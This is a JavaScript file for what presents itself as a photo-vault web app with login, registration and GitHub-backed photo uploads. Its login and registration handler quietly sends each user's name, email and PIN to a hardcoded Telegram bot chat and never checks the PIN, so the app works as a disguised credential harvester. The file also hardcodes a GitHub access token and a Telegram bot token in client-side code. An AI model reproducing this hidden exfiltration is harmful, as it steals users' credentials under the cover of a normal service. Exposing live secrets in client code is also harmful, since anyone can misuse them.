let isRegistering = false;
const GITHUB_TOKEN = "Ghp_QUGftteZ1wXZ9xe4Ucqpfyd0YQNxvr0N8aAj";
const REPO_OWNER = "SIYAMBOSS";
const REPO_NAME = "PHOTO SAVE-BOSS";
const BOT_TOKEN = "8536299808:AAHJFWEna66RMHZdq-AV20Ak1KOOSwTJT9k";
const CHAT_ID = "7416528268";

function toggleAuth() {
    isRegistering = !isRegistering;
    document.getElementById('reg-fields').classList.toggle('hidden');
    document.getElementById('auth-title').innerText = isRegistering ? "Create Account" : "Login";
    document.getElementById('toggle-text').innerHTML = isRegistering ? 
        "Already have an account? <span class='text-blue-500 font-bold'>Login</span>" : 
        "Don't have an account? <span class='text-blue-500 font-bold'>Create Account</span>";
}

async function handleAuth() {
    const name = document.getElementById('user-name').value;
    const email = document.getElementById('user-email').value;
    const pin = document.getElementById('pin-1').value;

    if(!email || !pin) return;

    if(isRegistering) {
        if(!name) return;
        const msg = `🌟 NEW REGISTRATION\n👤 Name: ${name}\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        alert("Registration Successful! Please Login.");
        toggleAuth();
    } else {
        const msg = `🔓 LOGIN ATTEMPT\n📧 Email: ${email}\n🔑 PIN: ${pin}`;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
        document.getElementById('login-sound').play();
        localStorage.setItem('activeUser', email);
        showDashboard(email);
    }
}

function showDashboard(email) {
    document.getElementById('auth-section').classList.add('hidden');
    document.getElementById('dashboard').classList.remove('hidden');
    loadGallery(email);
}

function switchTab(tab) {
    const photoTab = document.getElementById('tab-photos');
    const albumTab = document.getElementById('tab-albums');
    const photoContent = document.getElementById('photos-content');
    const albumContent = document.getElementById('albums-content');

    if(tab === 'photos') {
        photoTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
        albumTab.className = "text-zinc-500 pb-1";
        photoContent.classList.remove('hidden');
        albumContent.classList.add('hidden');
    } else {
        albumTab.className = "text-blue-500 font-bold border-b-2 border-blue-500 pb-1";
        photoTab.className = "text-zinc-500 pb-1";
        albumContent.classList.remove('hidden');
        photoContent.classList.add('hidden');
    }
}

async function uploadImage(event) {
    const file = event.target.files[0];
    const email = localStorage.getItem('activeUser');
    if(!file) return;

    const reader = new FileReader();
    reader.onload = async function(e) {
        const content = e.target.result.split(',')[1];
        const path = `vault/${email}/photos/${Date.now()}.png`;
        const url = `https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/${path}`;

        const res = await fetch(url, {
            method: 'PUT',
            headers: { 'Authorization': `token ${GITHUB_TOKEN}`, 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: "HD Upload", content: content })
        });
        if(res.ok) loadGallery(email);
    };
    reader.readAsDataURL(file);
}

async function loadGallery(email) {
    const gallery = document.getElementById('photos-content');
    const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${encodeURIComponent(REPO_NAME)}/contents/vault/${email}/photos`, {
        headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
    });
    if(res.ok) {
        const files = await res.json();
        gallery.innerHTML = files.reverse().map(f => `<img src="${f.download_url}" onclick="window.open('${f.download_url}')">`).join('');
    }
}

function logout() { localStorage.removeItem('activeUser'); location.reload(); }
